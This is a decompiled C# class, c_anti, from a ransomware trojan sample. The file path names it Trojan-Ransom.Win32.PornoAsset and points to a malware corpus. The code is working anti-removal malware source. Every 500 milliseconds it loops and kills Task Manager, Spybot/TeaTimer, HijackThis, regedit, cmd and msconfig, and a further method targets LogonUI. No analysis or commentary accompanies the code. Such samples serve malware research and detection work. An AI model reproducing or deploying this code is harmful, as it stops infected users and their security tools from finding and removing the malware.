// Decompiled with JetBrains decompiler
// Type: ABC_Bot.c_anti
// Assembly: ABC-Bot LITE, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E9E554F4-9AFA-414B-A1D5-AE64E23AD16E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00013-msil\Trojan-Ransom.Win32.PornoAsset.davi-d3bafcbbb2aacb297f2bd46e205cfb6b97d90b2a88fecf80d25ec75555856328.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Threading;

namespace ABC_Bot
{
  public class c_anti
  {
    [DebuggerNonUserCode]
    public c_anti()
    {
    }

    public static object intervall()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_8:
        int num3 = 3;
label_1:
        num3 = 4;
        c_anti.taskmgr();
label_2:
        num3 = 5;
        c_anti.spybot();
label_3:
        num3 = 6;
        c_anti.hijackthis();
label_4:
        num3 = 7;
        c_anti.regedit();
label_5:
        num3 = 8;
        c_anti.cmd();
label_6:
        num3 = 9;
        c_anti.msconfig();
label_7:
        num3 = 10;
        Thread.Sleep(Conversions.ToInteger("500"));
        goto label_8;
label_10:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
              case 3:
              case 11:
                goto label_8;
              case 4:
                goto label_1;
              case 5:
                goto label_2;
              case 6:
                goto label_3;
              case 7:
                goto label_4;
              case 8:
                goto label_5;
              case 9:
                goto label_6;
              case 10:
                goto label_7;
              case 12:
                goto label_15;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_10;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_15:
      object obj1;
      object obj2 = obj1;
      if (num2 == 0)
        return obj2;
      ProjectData.ClearProjectError();
      return obj2;
    }

    private static object taskmgr()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        Process[] processesByName = Process.GetProcessesByName(nameof (taskmgr));
        int index = 0;
        goto label_5;
label_3:
        num3 = 3;
        Process process;
        process.Kill();
        checked { ++index; }
label_4:
        num3 = 4;
label_5:
        if (index < processesByName.Length)
        {
          process = processesByName[index];
          goto label_3;
        }
        else
          goto label_12;
label_7:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_12;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_7;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_12:
      object obj1;
      object obj2 = obj1;
      if (num2 == 0)
        return obj2;
      ProjectData.ClearProjectError();
      return obj2;
    }

    private static object logonUI()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        Process[] processesByName = Process.GetProcessesByName(nameof (logonUI));
        int index = 0;
        goto label_5;
label_3:
        num3 = 3;
        Process process;
        process.Kill();
        checked { ++index; }
label_4:
        num3 = 4;
label_5:
        if (index < processesByName.Length)
        {
          process = processesByName[index];
          goto label_3;
        }
        else
          goto label_12;
label_7:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_12;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_7;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_12:
      object obj1;
      object obj2 = obj1;
      if (num2 == 0)
        return obj2;
      ProjectData.ClearProjectError();
      return obj2;
    }

    private static object spybot()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        Process[] processesByName1 = Process.GetProcessesByName("teatimer");
        int index1 = 0;
        goto label_5;
label_3:
        num3 = 3;
        Process process1;
        process1.Kill();
        checked { ++index1; }
label_4:
        num3 = 4;
label_5:
        if (index1 < processesByName1.Length)
        {
          process1 = processesByName1[index1];
          goto label_3;
        }
label_6:
        num3 = 5;
        Process[] processesByName2 = Process.GetProcessesByName(nameof (spybot));
        int index2 = 0;
        goto label_10;
label_8:
        num3 = 6;
        Process process2;
        process2.Kill();
        checked { ++index2; }
label_9:
        num3 = 7;
label_10:
        if (index2 < processesByName2.Length)
        {
          process2 = processesByName2[index2];
          goto label_8;
        }
label_11:
        num3 = 8;
        Process[] processesByName3 = Process.GetProcessesByName("spybot-sd");
        int index3 = 0;
        goto label_15;
label_13:
        num3 = 9;
        Process process3;
        process3.Kill();
        checked { ++index3; }
label_14:
        num3 = 10;
label_15:
        if (index3 < processesByName3.Length)
        {
          process3 = processesByName3[index3];
          goto label_13;
        }
        else
          goto label_22;
label_17:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_6;
              case 6:
                goto label_8;
              case 7:
                goto label_9;
              case 8:
                goto label_11;
              case 9:
                goto label_13;
              case 10:
                goto label_14;
              case 11:
                goto label_22;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_17;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_22:
      object obj1;
      object obj2 = obj1;
      if (num2 == 0)
        return obj2;
      ProjectData.ClearProjectError();
      return obj2;
    }

    private static object hijackthis()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        Process[] processesByName = Process.GetProcessesByName(nameof (hijackthis));
        int index = 0;
        goto label_5;
label_3:
        num3 = 3;
        Process process;
        process.Kill();
        checked { ++index; }
label_4:
        num3 = 4;
label_5:
        if (index < processesByName.Length)
        {
          process = processesByName[index];
          goto label_3;
        }
        else
          goto label_12;
label_7:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_12;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_7;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_12:
      object obj1;
      object obj2 = obj1;
      if (num2 == 0)
        return obj2;
      ProjectData.ClearProjectError();
      return obj2;
    }

    private static object regedit()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        Process[] processesByName = Process.GetProcessesByName(nameof (regedit));
        int index = 0;
        goto label_5;
label_3:
        num3 = 3;
        Process process;
        process.Kill();
        checked { ++index; }
label_4:
        num3 = 4;
label_5:
        if (index < processesByName.Length)
        {
          process = processesByName[index];
          goto label_3;
        }
        else
          goto label_12;
label_7:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_12;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_7;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_12:
      object obj1;
      object obj2 = obj1;
      if (num2 == 0)
        return obj2;
      ProjectData.ClearProjectError();
      return obj2;
    }

    private static object cmd()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        Process[] processesByName = Process.GetProcessesByName(nameof (cmd));
        int index = 0;
        goto label_5;
label_3:
        num3 = 3;
        Process process;
        process.Kill();
        checked { ++index; }
label_4:
        num3 = 4;
label_5:
        if (index < processesByName.Length)
        {
          process = processesByName[index];
          goto label_3;
        }
        else
          goto label_12;
label_7:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_12;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_7;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_12:
      object obj1;
      object obj2 = obj1;
      if (num2 == 0)
        return obj2;
      ProjectData.ClearProjectError();
      return obj2;
    }

    private static object msconfig()
    {
label_0:
      int num1;
      int num2;
      try
      {
        ProjectData.ClearProjectError();
        num1 = -2;
label_1:
        int num3 = 2;
        Process[] processesByName = Process.GetProcessesByName(nameof (msconfig));
        int index = 0;
        goto label_5;
label_3:
        num3 = 3;
        Process process;
        process.Kill();
        checked { ++index; }
label_4:
        num3 = 4;
label_5:
        if (index < processesByName.Length)
        {
          process = processesByName[index];
          goto label_3;
        }
        else
          goto label_12;
label_7:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num4 = num2 + 1;
            num2 = 0;
            switch (num4)
            {
              case 1:
                goto label_0;
              case 2:
                goto label_1;
              case 3:
                goto label_3;
              case 4:
                goto label_4;
              case 5:
                goto label_12;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_7;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_12:
      object obj1;
      object obj2 = obj1;
      if (num2 == 0)
        return obj2;
      ProjectData.ClearProjectError();
      return obj2;
    }
  }
}
